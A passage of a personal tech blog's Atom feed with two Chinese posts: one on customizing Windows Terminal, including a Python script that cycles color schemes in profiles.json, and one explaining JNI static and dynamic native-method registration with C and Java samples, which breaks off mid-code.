<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>饭先生&#39;s Room</title>
  
  <subtitle>I don&#39;t know where we are.</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://fanxs-t.github.io/"/>
  <updated>2019-11-08T07:15:25.822Z</updated>
  <id>http://fanxs-t.github.io/</id>
  
  <author>
    <name>Fanxs</name>
    
  </author>
  
  <generator uri="http://hexo.io/">Hexo</generator>
  
  <entry>
    <title>【氵】Windows Terminal 设置</title>
    <link href="http://fanxs-t.github.io/2019/11/08/%E3%80%90%E6%B0%B5%E3%80%91Windows%20Terminal%20%E8%AE%BE%E7%BD%AE/"/>
    <id>http://fanxs-t.github.io/2019/11/08/【氵】Windows Terminal 设置/</id>
    <published>2019-11-08T04:00:00.000Z</published>
    <updated>2019-11-08T07:15:25.822Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：<br>最近在写些测试工具，没时间写点文章（懒）。这两天发现了Windows Terminal，研究了一下怎么设置，水一篇博文。</p></blockquote><h2 id="0x00-Windows-Terminal-配置"><a href="#0x00-Windows-Terminal-配置" class="headerlink" title="0x00. Windows Terminal 配置"></a>0x00. Windows Terminal 配置</h2><p><code>Windows Terminal</code>顾名思义就是「Windows 终端」，是一款全新的，现代的快速、高效且功能强大的终端应用程序。它同时适用于会用到：「命令提示符」、「PowerShell」和 「WSL」等命令行交互的用户。目前最新的版本中，Windows Terminal会自动识别系统中安装的WSL系统，可直接在ws终端中打开WSL。</p><p>Windows Terminal的好处有很多，其中有一点当然就是它好看，比Powershell和cmd的样式要好看很多，同时也允许我们对样式进行自定义。这篇文章就是闲来研究了一下ws的设置，怎么样给它整好看点儿。</p><p>在窗口上方打开Settings就可以开始对WS的配置。按住Alt再点击<code>Settings</code>则会打开默认设置default.json<br><img src="http://148.70.228.11/upload/6172c130528b1632faaf3238e3106567.png" alt=""></p><p>打开后可看到<code>profiles.json</code>的结构很简单，包含有globals配置，profiles，schemes和keybindings等。globals的配置涉及到终端的一些使用配置，可以不用做修改。要设置ws的展示样式，主要关注profiles/schemes两项。<br><img src="http://148.70.228.11/upload/0623632bb630249adfdc52a786cc9c59.png" alt=""></p><h2 id="0x01-Profiles设置"><a href="#0x01-Profiles设置" class="headerlink" title="0x01. Profiles设置"></a>0x01. Profiles设置</h2><p>Profiles项主要用来做终端的基础设置，如背景、初始文件夹、光标、字体等。具体可参考链接<a href="https://github.com/microsoft/terminal/blob/master/doc/cascadia/SettingsSchema.md" target="_blank" rel="noopener">Profiles设置</a>。</p><p>Profiles中可设置很多选项来达到不一样的视觉效果，以下为挑出来的，我认为有较大作用的：<br>设置项|作用<br>—-|—<br>backgroundImage|背景图片<br>backgroundImageAlignment|背景图片的对齐设置<br>backgroundImageOpacity|背景图片透明度<br>backgroundImageStretchMode|背景图片拉伸设置<br>colorScheme|使用的字体颜色方案<br>cursorColor|光标颜色<br>cursorShape|光标的形状<code>&quot;vintage&quot;</code> ( ▃ ), <code>&quot;bar&quot;</code> ( ┃ ), <code>&quot;underscore&quot;</code> ( ▁ ), <code>&quot;filledBox&quot;</code> ( █ ), <code>&quot;emptyBox&quot;</code> ( ▯ )<br>cursorHeight|光标的高度（仅当光标为vintage时生效<br>fontFace|字体<br>fontSize|字体大小<br>historySize|可追述的历史记录数<br>icon|这个Tab显示的logo<br>padding|字体周围的padding，格式为“8, 8, 8, 8”<br>snapOnInput|设置为True时，在打字时会自动跳转到输入行<br>startingDirectory|开启终端时的目录<br>tabTitle|这个终端tab的名字<br>useAcrylic|亚克力背景，终端背景会像蒙着一层亚克力，半透明化<br>acrylicOpacity|设置亚克力背景透明度<br>foreground|前景颜色<br>background|背景颜色</p><p>这里所谓的前景颜色<code>foreground</code>，会影响终端字体输出的颜色，而<code>background</code>则为终端背景的颜色，这两项建议直接在scheme中所设置，当然如果对这两项有个人喜好的话，可以在profiles中设置，会覆盖scheme中这两项的设置。</p><h2 id="0x02-Profiles例子"><a href="#0x02-Profiles例子" class="headerlink" title="0x02. Profiles例子"></a>0x02. Profiles例子</h2><p>通过对<code>profiles</code>的设置，可以设置很多的效果，如设置background为图片：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;backgroundImage&quot; : &quot;C:/Wallpapers/秒速五厘米.png&quot;,</span><br><span class="line">&quot;backgroundImageOpacity&quot; : 0.8,</span><br></pre></td></tr></table></figure></p><p><img src="http://148.70.228.11/upload/6d3feaa906ad0c0774961bd8eb034c38.png" alt=""><br>这里的backgroundImage支持很多URI协议，可以直接图片的网络地址：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&quot;backgroundImage&quot; : &quot;https://example/1.jpg&quot;,</span><br></pre></td></tr></table></figure></p><p>background也可以设置为动图：<br><img src="https://www.appliedis.com/wp-content/uploads/2019/08/nyan.gif" alt=""></p><p>不想使用背景图片时，可以使用单一颜色作背景。此时设置毛玻璃亚克力背景的效果，会出现半透明化：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;acrylicOpacity&quot; : 0.5,</span><br><span class="line">&quot;useAcrylic&quot; : true,</span><br></pre></td></tr></table></figure></p><p><img src="http://148.70.228.11/upload/4b1fe05fa5284981443e3cb561bd2704.png" alt=""><br>然后还可以设置字体，字体大小等等，就不一一陈述。</p><h2 id="0x03-Schemes设置"><a href="#0x03-Schemes设置" class="headerlink" title="0x03. Schemes设置"></a>0x03. Schemes设置</h2><p>Schemes项中，主要是设置终端字体的颜色。打开设置时，能看到schemes中的一个默认配色scheme:<br><img src="http://148.70.228.11/upload/34d504dcb1f9775dfa5bdee6aa143439.png" alt=""><br>这里的<code>foreground</code>和<code>background</code>为终端的前景和背景颜色。<code>colors</code>中对应的是<code>16-ANSI-color</code>。虽然不同终端（入Xterm,Putty,Ubuntu等）可以显示至少256种颜色，但是大部分终端都会采取16种颜色来做不同处字体的显示颜色，这就是所谓的<code>16-ANSI-color</code>方案。以下图片显示了针对这16-ANSI-color，不同终端的自定义颜色：<br><img src="http://148.70.228.11/upload/6920cf73ad40d1285e5fb41dab3a8d3c.png" alt=""></p><p>Windows Terminal也是采用了这种方案。Schemes项中的<code>colors</code>项的顺序则对应以下的表格：<br><img src="http://148.70.228.11/upload/66c67b7628982683849d402843337a38.png" alt=""></p><p>这个方案看似清楚，但是在网上未能找到这个16-ANSI-color的颜色具体对应到什么地方的资料。比如使用默认的方案时，命令的参数，类似<code>--c</code>，颜色非常的淡，根本看不清楚，此时就不知道要修改colors里的哪一项颜色，只能一项一项地去尝试。</p><p>其实对于Schemes，网上有许多成套的配色方案：<a href="https://github.com/mbadolato/iTerm2-Color-Schemes/tree/master/windowsterminal" target="_blank" rel="noopener">iTerm2-Color-Schemes</a>，可以一个一个去尝试这些配色方案，选择自己喜欢、适配终端背景的方案。这里我写了个脚本来协助完成这个事情：</p><ol><li>先git clone <a href="https://github.com/mbadolato/iTerm2-Color-Schemes/tree/master/windowsterminal" target="_blank" rel="noopener">iTerm2-Color-Schemes</a>这个项目中的所有Windows Terminal方案，放到文件夹中。</li><li>找到自己ws的profiles.json的地址。常规地址是<br><code>C:\Users\lenovo\AppData\Local\Packages\Microsoft.WindowsTerminal_8wekyb3d8bbwe\LocalState\profiles.json</code></li><li>在脚本中写入保存所有ws schemes的文件夹和profiles.json的路径。</li><li>运行脚本，按键盘任意键切换schemes，按<code>ESC</code>退出。这个脚本结束时并不会修改profiles文件，在看到喜欢的scheme时可按<code>ESC</code>退出，并根据终端里输出的方案名自行修改profiles文件。</li></ol><p><img src="http://148.70.228.11/upload/15.gif" alt=""><br>Python脚本:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8</span></span><br><span class="line"><span class="comment"># Author : Fanxs</span></span><br><span class="line"><span class="comment"># 2019-11-08</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">from</span> pynput <span class="keyword">import</span> keyboard</span><br><span class="line"></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"><span class="string">This script enumerates all the schemes in the `scheme_directory and changes </span></span><br><span class="line"><span class="string">the profiles.json when the computer user press any key. Press `ESC` to stop.</span></span><br><span class="line"><span class="string">This script restores the original profile when finished.</span></span><br><span class="line"><span class="string">'''</span></span><br><span class="line"></span><br><span class="line">config = <span class="string">"C:\\Users\\lenovo\\AppData\\Local\\Packages\\Microsoft.WindowsTerminal_8wekyb3d8bbwe\\LocalState\\profiles.json"</span></span><br><span class="line">schemes_directory = <span class="string">"C:\\Users\\lenovo\\Desktop\\windowsterminal"</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getScheme</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">for</span> _ <span class="keyword">in</span> all_schemes:</span><br><span class="line">        <span class="keyword">with</span> open(_, <span class="string">"r"</span>) <span class="keyword">as</span> h:</span><br><span class="line">            option = json.loads(h.read().strip())</span><br><span class="line">            name = option[<span class="string">"name"</span>]</span><br><span class="line">            option[<span class="string">"name"</span>] = <span class="string">"Option"</span></span><br><span class="line">            <span class="keyword">yield</span> (name, option)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="comment"># Get the original contents</span></span><br><span class="line">    <span class="keyword">with</span> open(config, <span class="string">'r+'</span>) <span class="keyword">as</span> handle:</span><br><span class="line">        original_json = handle.read()</span><br><span class="line">        handle.seek(<span class="number">0</span>)</span><br><span class="line">        content = <span class="string">""</span></span><br><span class="line">        <span class="keyword">for</span> _ <span class="keyword">in</span> handle.readlines():</span><br><span class="line">            c = _.strip()</span><br><span class="line">            <span class="keyword">if</span> c.startswith(<span class="string">"//"</span>):</span><br><span class="line">                <span class="keyword">continue</span></span><br><span class="line">            content += c</span><br><span class="line">    <span class="comment"># Modify the profiles</span></span><br><span class="line">    <span class="comment"># Set all colorSchemes to "Option"</span></span><br><span class="line">    configuration = json.loads(content)</span><br><span class="line">    profiles = configuration[<span class="string">"profiles"</span>]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> range(<span class="number">0</span>, len(profiles), <span class="number">1</span>):</span><br><span class="line">        profiles[p][<span class="string">"colorScheme"</span>] = <span class="string">"Option"</span></span><br><span class="line">    <span class="comment"># Get all schemes</span></span><br><span class="line">    all_schemes = [os.path.join(schemes_directory, i) <span class="keyword">if</span> i.endswith(<span class="string">".json"</span>) <span class="keyword">else</span> <span class="keyword">None</span> <span class="keyword">for</span> i <span class="keyword">in</span></span><br><span class="line">                 os.listdir(schemes_directory)]</span><br><span class="line">    <span class="keyword">return</span> (original_json, configuration, all_schemes)</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">process</span><span class="params">(jo)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        name, option = next(generator)</span><br><span class="line">        jo[<span class="string">"schemes"</span>].append(option)</span><br><span class="line">        <span class="comment"># 关掉文件才能更新配色，所以需要重复开关文件</span></span><br><span class="line">        <span class="keyword">with</span> open(config, <span class="string">'r+'</span>) <span class="keyword">as</span> handle:</span><br><span class="line">            handle.seek(<span class="number">0</span>)</span><br><span class="line">            handle.write(json.dumps(jo))</span><br><span class="line">            handle.truncate()</span><br><span class="line">            handle.flush()</span><br><span class="line">            print(<span class="string">"\r"</span>,<span class="string">"%s --&gt; Press key to Next ------------"</span> % name, end=<span class="string">""</span>, flush=<span class="keyword">True</span>)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        ending(str(e))</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ending</span><span class="params">(msg)</span>:</span></span><br><span class="line">    msg = <span class="string">"\n[*] Ending."</span> <span class="keyword">if</span> <span class="keyword">not</span> msg <span class="keyword">else</span> msg</span><br><span class="line">    <span class="keyword">with</span> open(config, <span class="string">'w'</span>) <span class="keyword">as</span> handle:</span><br><span class="line">        handle.write(original_json)</span><br><span class="line">    print(msg)</span><br><span class="line">    exit()</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">on_press</span><span class="params">(key)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> key == keyboard.Key.esc:</span><br><span class="line">        <span class="comment"># Stop listener</span></span><br><span class="line">        ending(<span class="string">"\n[*] Finished by Key.esc"</span>)</span><br><span class="line">    jo = configuration</span><br><span class="line">    process(jo)</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">    original_json, configuration, all_schemes = init()</span><br><span class="line">    generator = getScheme()</span><br><span class="line">    keyboard_listener = keyboard.Listener(on_press=on_press)</span><br><span class="line">    keyboard_listener.start()</span><br><span class="line">    keyboard_listener.join()</span><br></pre></td></tr></table></figure></p><h2 id="0x04-Keybindings快捷键"><a href="#0x04-Keybindings快捷键" class="headerlink" title="0x04. Keybindings快捷键"></a>0x04. Keybindings快捷键</h2><p>在设置文件中，还可以在keybindings项中设置快捷键。具体参考<a href="https://github.com/microsoft/terminal/blob/master/doc/cascadia/SettingsSchema.md#keybindings" target="_blank" rel="noopener">Keybindings设置</a>。</p><p>设置keybindings的格式，可以参考Windows Terminal的defaults.json：<br><img src="http://148.70.228.11/upload/3ac0bcdb7d581062817bfaf835f02fd5.png" alt=""></p><p>这是Windows Terminal的默认快捷键，可根据这个格式，按自己的喜好自定义快捷键。注意的是，现在Windwos Terminal是支持分屏的，但是并没有默认快捷键来进行支持。可以在keybindings选项中加入，比如我加的是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&#123; &quot;command&quot;: &quot;splitVertical&quot;, &quot;keys&quot;: [&quot;alt+-&quot;] &#125;,</span><br><span class="line">&#123; &quot;command&quot;: &quot;splitHorizontal&quot;, &quot;keys&quot;: [&quot;alt+=&quot;] &#125;</span><br></pre></td></tr></table></figure></p><p>然后就可以用快捷键来进行分屏：<br><img src="http://148.70.228.11/upload/4c290f9bd2b0449a48a543c4efae8c27.png" alt=""></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;blockquote&gt;
&lt;p&gt;前言：&lt;br&gt;最近在写些测试工具，没时间写点文章（懒）。这两天发现了Windows Terminal，研究了一下怎么设置，水一篇博文。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;h2 id=&quot;0x00-Windows-Terminal-配置&quot;&gt;&lt;a h
      
    
    </summary>
    
      <category term="水贴" scheme="http://fanxs-t.github.io/categories/%E6%B0%B4%E8%B4%B4/"/>
    
    
      <category term="氵" scheme="http://fanxs-t.github.io/tags/%E6%B0%B5/"/>
    
  </entry>
  
  <entry>
    <title>JNI调用和动态注册探索</title>
    <link href="http://fanxs-t.github.io/2019/08/19/JNI%E8%B0%83%E7%94%A8%E5%92%8C%E5%8A%A8%E6%80%81%E6%B3%A8%E5%86%8C%E6%8E%A2%E7%B4%A2/"/>
    <id>http://fanxs-t.github.io/2019/08/19/JNI调用和动态注册探索/</id>
    <published>2019-08-19T01:14:05.000Z</published>
    <updated>2019-08-19T08:00:54.555Z</updated>
    
    <content type="html"><![CDATA[<blockquote><p>前言：<br>之前在测试一个APP时，需要自己去写一个APP调用so库来进行通信的加解密。由于so文件使用了动态注册，所以没能找到对应的Native加解密方法来进行分析。所以这一篇就自己探索一下JNI接口了调用so库的方法，以及如何发现和定位动态注册的JNI接口。</p></blockquote><h2 id="0x00-JNI接口"><a href="#0x00-JNI接口" class="headerlink" title="0x00. JNI接口"></a>0x00. JNI接口</h2><p>在Java中声明并调用了Native方法时，在运行时必须要让JVM找到对应的函数。Java层会通过JNI（Java Native Interface)来访问到Native层：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Java &lt;---&gt; JNI &lt;---&gt; Native</span><br></pre></td></tr></table></figure></p><p>Java代码调用Native函数，需要在类中加载so文件，并声明要调用的Native方法：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.test.jni;</span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HelloWorldJNI</span> </span>&#123;</span><br><span class="line">    <span class="comment">//加载so文件</span></span><br><span class="line">    <span class="keyword">static</span> &#123;</span><br><span class="line">        System.loadLibrary(<span class="string">"native"</span>);</span><br><span class="line">    &#125;     </span><br><span class="line">    <span class="comment">// 声明Native方法sayHello，返回值为空</span></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">native</span> <span class="keyword">void</span> <span class="title">sayHello</span><span class="params">()</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="comment">//通过HelloWorldJNI对象调用</span></span><br><span class="line">        <span class="keyword">new</span> HelloWorldJNI().sayHello();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>这里在类HelloWorldJNI中调用了Native方法sayHello。运行时，需要JNI定位到目标函数。有两种方法能映射so文件中的目标函数：</p><ul><li>静态注册</li><li>动态注册</li></ul><h2 id="0x01-静态注册"><a href="#0x01-静态注册" class="headerlink" title="0x01. 静态注册"></a>0x01. 静态注册</h2><p>静态注册时，C/C++文件代码中，需要以固定的命名规则来命名导出的JNI函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* </span></span><br><span class="line"><span class="comment">- 命名规则：</span></span><br><span class="line"><span class="comment">Java_&#123;package_and_classname&#125;_&#123;function_name&#125;(JNI_arguments)`，用下划线代替"."</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">- 参数：</span></span><br><span class="line"><span class="comment">JNIEnv*: JNI环境的引用</span></span><br><span class="line"><span class="comment">jobject:  "this" Java对象的引用</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL <span class="title">Java_com_testing_jni_HelloWorldJNI_sayHello</span><span class="params">(JNIEnv* env, jobject thisObject)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>JNIEnv类提供了JNI环境的许多信息和方法，具体结构可看：<br><a href="http://xdprof.sourceforge.net/doxygen/structJNIEnv__.html" target="_blank" rel="noopener">http://xdprof.sourceforge.net/doxygen/structJNIEnv__.html</a><br><img src="http://148.70.228.11/upload/426dd70d4bfdc9ae1937104f5ae2be88.png" alt=""></p><p>除了固定的命名规则以外，还需要用JNIEXPORT和JNICALL来标识JNI方法。在/Android/SDK/ndk-bundle/……/include/jni.h中，可看到JNIEXPORT和JNICALL的宏定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JNIIMPORT</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JNIEXPORT  __attribute__ ((visibility (<span class="meta-string">"default"</span>)))</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> JNICALL</span></span><br></pre></td></tr></table></figure></p><p><img src="http://148.70.228.11/upload/302f6c537643bb346a9664598db139ad.png" alt=""><br>JNIEXPORT 确保标识的函数被正常导出。C++中提供了elf文件的<a href="http://gcc.gnu.org/wiki/Visibility" target="_blank" rel="noopener">导出表隐藏功能</a>，而为了JNI能找到Native方法，需要设置Visibility属性为”default“, 即确保标识函数会出现到so文件的导出表中，因此JNI接口可以找到目标方法。JNICALL 则确保函数的命名规范正确。</p><p>Native方法静态注册后，JNI环境可以很轻松地在so的导出表中，根据调用者的包名、类名和方法名，找到对应的方法。</p><h2 id="0x02-动态注册"><a href="#0x02-动态注册" class="headerlink" title="0x02. 动态注册"></a>0x02. 动态注册</h2><p>除了使用静态注册这种传统方法实现JNI外，也可以使用RegisterNatives动态实现JNI。</p><p>JNIEnv类中提供了动态注册Native函数的方法<strong>RegisterNatives</strong>，这个方法可动态地将so库中的方法名，与JVM中某个类调用的Native方法名做绑定和映射，这样JNI就不需要通过函数命名规则来搜索目标函数，可直接在JNIEnv中定位目标函数。动态注册的过程，一般发生在JNI_Onload执行期间。</p><p>JVM在System.loadLibrary加载so文件时，会第一时间调用JNI_Onload函数，它有两个重要的作用：</p><ul><li>指定JNI版本：告诉VM该组件使用那一个JNI版本(若未提供JNI_OnLoad()函数，VM会默认该使用最老的JNI 1.1版)，如果要使用新版本的JNI，例如JNI 1.4版，则必须由JNI_OnLoad()函数返回常量JNI_VERSION_1_4来告知VM。</li><li>初始化设定，进行各种资源的初始化操作。</li></ul><p>由于JNI_Onload执行了初始化资源的操作，动态注册也一般在初始化时进行。重写JNI_Onload函数：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;jni.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/stat.h&gt; </span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;fcntl.h&gt; </span></span></span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT <span class="keyword">void</span> JNICALL <span class="title">sayHello</span><span class="params">(JNIEnv* env, jobject thisObject)</span> </span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"Hello World!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//Java和JNI函数的绑定表</span></span><br><span class="line"><span class="keyword">static</span> JNINativeMethod gMethods[] = &#123;</span><br><span class="line">        &#123;<span class="string">"sayHello"</span>, <span class="string">"()V"</span>, (<span class="keyword">void</span> *)sayHello&#125;,</span><br><span class="line">&#125;; </span><br><span class="line"></span><br><span class="line"><span class="comment">//注册native方法到java中</span></span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">int</span> <span class="title">registerNativeMethods</span><span class="params">(JNIEnv* env, <span class="keyword">const</span> <span class="keyword">char</span>* className,JNINativeMethod* gMethods, <span class="keyword">int</span> numMethods)</span></span>&#123;</span><br><span class="line">    jclass clazz;</span><br><span class="line">    clazz = (*env)-&gt;FindClass(env, className); </span><br><span class="line">    <span class="keyword">if</span> (clazz == <span class="literal">NULL</span>) &#123; </span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> ((*env)-&gt;RegisterNatives(env, clazz, gMethods,numMethods) &lt; <span class="number">0</span>)&#123; </span><br><span class="line">        <span class="keyword">return</span> JNI_FALSE;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> JNI_TRUE;</span><br><span class="line">&#125; </span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">register_ndk_load</span><span class="params">(JNIEnv *env)</span></span>&#123; </span><br><span class="line">    <span class="keyword">return</span> registerNativeMethods(env, <span class="string">"com/testing/jni/HelloWorldJNI"</span>,gMethods,<span class="keyword">sizeof</span>(gMethods) / <span class="keyword">sizeof</span>(gMethods[<span class="number">0</span>])); </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function">JNIEXPORT jint <span class="title">JNI_OnLoad</span><span class="params">(JavaVM* vm, <span class="keyword">void</span>* reserved)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    JNIEnv* env = <span class="literal">NULL</span>;</span><br><span class="line">    jint result = <span class="number">-1</span>; </span><br><span class="line">    <span class="keyword">if</span> ((*vm)-&gt;GetEnv(vm, (<span class="keyword">void</span>**) &amp;env, JNI_VERSION_1_4) != JNI_OK)&#123; </span><br><span class="line">        <span class="keyword">return</span> result;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// 动态注册</span></span><br><span class="line">    register_ndk_load(env); </span><br><span class="line">    </span><br><span class="line">    <span class="comment">// 返回jni的版本</span></span><br><span class="line">    <span class="keyword">return</span> JNI_VERSION_1_4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>在C＋＋和Java中创建关联的是JNINativeMethod，保存了Java中调用的函数名和C++代码中函数名的映射关系，它在jni.h中定义：<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/*used in RegisterNatives to describe native method name, signature, and function pointer.*/</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> 